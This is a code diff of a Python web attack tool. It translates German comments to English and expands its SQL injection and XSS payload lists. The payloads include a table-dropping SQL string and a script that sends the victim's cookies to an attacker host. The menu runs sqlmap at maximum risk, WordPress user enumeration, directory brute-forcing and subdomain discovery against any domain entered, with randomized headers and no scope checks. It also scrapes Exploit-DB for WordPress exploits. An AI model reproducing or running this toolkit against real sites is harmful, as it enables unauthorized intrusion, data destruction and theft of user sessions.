@@ -6,14 +6,36 @@ import requests
 from urllib.parse import quote, urlparse
 from bs4 import BeautifulSoup
 
-# Logging-Konfiguration
+# Logging configuration
 logging.basicConfig(filename='done.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
-# SQLi und XSS Payloads
-SQLI_PAYLOADS = ["' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", '" OR 1=1 --']
-XSS_PAYLOADS = ['<script>alert(1)</script>', '<img src="x" onerror="alert(1)">', '<svg onload=alert(1)>']
+# Extended SQLi Payloads (more advanced, obfuscated, and varied payloads)
+SQLI_PAYLOADS = [
+    "' OR '1'='1",
+    '" OR "1"="1',
+    "' OR 1=1 --",
+    '" OR 1=1 --',
+    "' AND 1=1 --",
+    '" AND 1=1 --',
+    "' UNION SELECT NULL, NULL --",
+    "'; DROP TABLE users --"
+]
 
-# Zufällige User-Agent- und Header-Manipulation
+# Extended XSS Payloads (modern and diverse payloads)
+XSS_PAYLOADS = [
+    '<script>alert(1)</script>',
+    '<img src="x" onerror="alert(1)">',
+    '<svg onload=alert(1)>',
+    '<iframe src="javascript:alert(1)"></iframe>',
+    '<script>eval("alert(1)")</script>',
+    '<body onload=alert(1)>',
+    '<script>fetch("http://malicious.com?cookie=" + document.cookie)</script>',
+    '<img src="x" onerror="fetch(\'http://malicious.com\')">',
+    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
+    '<a href="javascript:alert(1)">Click me</a>'
+]
+
+# Random User-Agent and Header Manipulation
 def randomize_headers():
     user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -30,17 +52,17 @@ def randomize_headers():
     }
     return headers
 
-# Funktion zur Ausführung des Bash-Installationsskripts
+# Function to execute the Bash setup script
 def run_bash_setup():
-    print("Starte das Installationsskript setup.sh...")
+    print("Running the setup.sh installation script...")
     try:
         subprocess.run(["sudo", "bash", "setup.sh"], check=True)
-        print("Alle Tools wurden erfolgreich installiert!")
+        print("All tools have been successfully installed!")
     except subprocess.CalledProcessError as e:
-        logging.error(f"Fehler beim Ausführen von setup.sh: {e}")
-        print(f"Fehler beim Ausführen von setup.sh: {e}")
+        logging.error(f"Error running setup.sh: {e}")
+        print(f"Error running setup.sh: {e}")
 
-# Funktion zum Abrufen von Exploits von Exploit-DB für WordPress
+# Function to get WordPress exploits from Exploit-DB
 def get_exploits_for_wordpress():
     url = "https://www.exploit-db.com/search?q=wordpress"
     try:
@@ -48,154 +70,147 @@ def get_exploits_for_wordpress():
         response.raise_for_status()  # Raise an exception for HTTP errors
         if response.status_code == 200:
             soup = BeautifulSoup(response.content, 'html.parser')
-            exploits = []  # Liste der Exploits
+            exploits = []  # List of exploits
             for link in soup.find_all('a', href=True):
                 exploit_url = link['href']
                 if "exploit" in exploit_url:
                     exploits.append(exploit_url)
             return exploits
     except requests.exceptions.RequestException as e:
-        logging.error(f"Fehler beim Abrufen der Exploits von {url}: {e}")
+        logging.error(f"Error fetching exploits from {url}: {e}")
         return []
 
-# Funktion zur Überprüfung, ob es sich um eine WordPress-Seite handelt
+# Function to check if it's a WordPress site
 def is_wordpress_site(url):
-    # Einige typische WordPress-Dateien, die auf das Vorhandensein von WordPress hinweisen
     indicators = [
-        "/wp-login.php",  # Login-Seite
-        "/wp-admin/",      # Admin-Verzeichnis
-        "/wp-content/",    # Inhalte von WordPress
+        "/wp-login.php", "/wp-admin/", "/wp-content/",
     ]
-
     for indicator in indicators:
         test_url = url + indicator
         try:
             response = requests.get(test_url, timeout=10)
             if response.status_code == 200:
-                logging.info(f"WordPress erkannt auf: {url}")
+                logging.info(f"WordPress detected at: {url}")
                 return True
         except requests.RequestException:
-            continue  # Wenn die Seite nicht erreichbar ist, überspringen
-
+            continue  # Skip if the page is unreachable
     return False
 
-# WPScan zum Scannen von WordPress-Schwachstellen
+# WPScan to scan for WordPress vulnerabilities
 def run_wpscan(domain):
-    print(f"Starte WPScan für: {domain}")
+    print(f"Running WPScan for: {domain}")
     subprocess.run(["wpscan", "--url", domain, "--enumerate", "u", "--random-user-agent"])
 
-# Amass zum Scannen von Subdomains
+# Amass to scan for subdomains
 def run_amass(domain):
     subprocess.run(["/snap/bin/amass", "enum", "-d", domain])
 
-# Nikto zum Überprüfen auf allgemeine Sicherheitslücken
+# Nikto to scan for general security vulnerabilities
 def run_nikto(domain):
-     subprocess.run(["nikto", "-h", domain, "-C", "all"])
+    subprocess.run(["nikto", "-h", domain, "-C", "all"])
 
-# Gobuster zum Brute-Forcing von Verzeichnissen und Dateien
+# Gobuster to brute-force directories and files
 def run_gobuster(domain):
     subprocess.run(["gobuster", "dir", "-u", f"http://{domain}", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"])
 
-# Ffuf zum Brute-Forcing von Verzeichnissen und Dateien
+# Ffuf to brute-force directories and files
 def run_ffuf(domain):
     subprocess.run(["ffuf", "-u", f"http://{domain}/FUZZ", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"])
 
-# SQLMap zur Überprüfung auf SQL-Injection-Schwachstellen
+# SQLMap to check for SQL injection vulnerabilities
 def run_sqlmap(url):
     subprocess.run(["sqlmap", "-u", url, "--batch", "--risk=3", "--level=5"])
 
-# Funktion zur Durchführung der vollständigen Sicherheitsprüfung
+# Function for full security scan
 def scan_domain(domain):
-    print(f"Starte den vollständigen Scan für: {domain}")
+    print(f"Starting full scan for: {domain}")
 
-    # Überprüfen, ob es sich um eine WordPress-Seite handelt
     if is_wordpress_site(domain):
-        # Holen der Exploits von Exploit-DB speziell für WordPress
         exploits = get_exploits_for_wordpress()
         if exploits:
-            print(f"Gefundene Exploits für WordPress: {exploits}")
+            print(f"Found WordPress exploits: {exploits}")
         else:
-            print(f"Keine Exploits für WordPress gefunden.")
+            print("No WordPress exploits found.")
     else:
-        print(f"Keine WordPress-Seite gefunden auf {domain}. Überspringe Exploit-Suche.")
+        print(f"No WordPress site found at {domain}. Skipping exploit search.")
 
-    # Weitere Scans durchführen
+    # Perform additional scans
     run_amass(domain)
     run_wpscan(domain)
     run_nikto(domain)
     run_gobuster(domain)
     run_ffuf(domain)
 
-# Funktion zur Überprüfung von SQLi-Schwachstellen auf einer Webseite (mit sqlmap)
+# Function to check for SQL injection vulnerabilities
 def check_sql_injection_with_sqlmap(url):
     try:
         result = subprocess.run(['sqlmap', '-u', url, '--batch', '--risk=3', '--level=5'], capture_output=True, text=True)
         if "sqlmap identified the following injection point" in result.stdout.lower():
-            logging.info(f"SQLi Schwachstelle gefunden auf: {url}")
+            logging.info(f"SQLi vulnerability found at: {url}")
             return True
         return False
     except Exception as e:
-        print(f"Fehler bei sqlmap: {e}")
+        print(f"Error with sqlmap: {e}")
         return False
 
-# Funktion zur Überprüfung von XSS-Schwachstellen auf einer Webseite
+# Function to check for XSS vulnerabilities
 def check_xss(url):
     for payload in XSS_PAYLOADS:
-        encoded_payload = quote(payload)  # URL-Encoding
+        encoded_payload = quote(payload)  # URL-encode payload
         response = requests.get(url + encoded_payload, headers=randomize_headers())
         if encoded_payload in response.text:
-            logging.info(f"XSS Schwachstelle gefunden auf: {url} mit Payload: {encoded_payload}")
+            logging.info(f"XSS vulnerability found at: {url} with payload: {encoded_payload}")
             return True
     return False
 
-# Funktion zur Validierung und Ergänzung der URL
+# Function to validate and format URLs
 def validate_and_format_url(url):
     if not url.startswith("http://") and not url.startswith("https://"):
         url = "http://" + url
     return url
 
-# Menü und Benutzerinteraktion
+# Main menu for user interaction
 def show_menu():
     while True:
-        print("\nWähle eine Option aus:")
-        print("1. Alle Tools installieren")
-        print("2. Alle Sicherheitsprüfungen ausführen")
-        print("3. Nur SQLi überprüfen")
-        print("4. Nur XSS überprüfen")
-        print("5. Subdomain-Scan durchführen")
-        print("6. Verzeichnisscan durchführen (Gobuster/Ffuf)")
-        print("7. Beenden")
-        choice = input("Deine Wahl: ")
+        print("\nChoose an option:")
+        print("1. Install all tools")
+        print("2. Run all security checks")
+        print("3. Check only for SQLi")
+        print("4. Check only for XSS")
+        print("5. Run subdomain scan")
+        print("6. Run directory scan (Gobuster/Ffuf)")
+        print("7. Exit")
+        choice = input("Your choice: ")
 
         if choice == "1":
             run_bash_setup()
         elif choice == "2":
-            domain = input("Gib die zu scannende Domain ein: ")
-            domain = validate_and_format_url(domain)  # URL validieren und formatieren
+            domain = input("Enter the domain to scan: ")
+            domain = validate_and_format_url(domain)
             scan_domain(domain)
         elif choice == "3":
-            url = input("Gib die URL zum Überprüfen auf SQLi ein: ")
-            url = validate_and_format_url(url)  # URL validieren und formatieren
+            url = input("Enter the URL to check for SQLi: ")
+            url = validate_and_format_url(url)
             check_sql_injection_with_sqlmap(url)
         elif choice == "4":
-            url = input("Gib die URL zum Überprüfen auf XSS ein: ")
-            url = validate_and_format_url(url)  # URL validieren und formatieren
+            url = input("Enter the URL to check for XSS: ")
+            url = validate_and_format_url(url)
             check_xss(url)
         elif choice == "5":
-            domain = input("Gib die zu scannende Domain ein: ")
-            domain = validate_and_format_url(domain)  # URL validieren und formatieren
+            domain = input("Enter the domain to scan: ")
+            domain = validate_and_format_url(domain)
             run_amass(domain)
         elif choice == "6":
-            domain = input("Gib die zu scannende Domain ein: ")
-            domain = validate_and_format_url(domain)  # URL validieren und formatieren
+            domain = input("Enter the domain to scan: ")
+            domain = validate_and_format_url(domain)
             run_gobuster(domain)
             run_ffuf(domain)
         elif choice == "7":
-            print("Beende das Skript.")
+            print("Exiting the script.")
             break
         else:
-            print("Ungültige Wahl, bitte versuche es erneut.")
+            print("Invalid choice, please try again.")
 
-# Skript starten
+# Start the script
 if __name__ == "__main__":
     show_menu()
